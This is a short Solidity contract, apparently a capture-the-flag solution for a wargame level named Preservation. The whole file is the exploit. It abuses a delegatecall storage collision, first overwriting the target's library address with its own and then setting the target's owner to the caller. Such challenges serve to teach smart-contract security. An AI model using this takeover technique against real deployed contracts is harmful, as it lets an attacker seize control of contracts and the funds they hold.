// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./16Preservation.sol";

contract PreservationSolution {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Preservation public preservation;

    constructor(address preservationAddress) {
        preservation = Preservation(preservationAddress);
    }

    function solveChallenge() public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(1);
    }

    function setTime(uint) public {
        owner = tx.origin;
    }
}
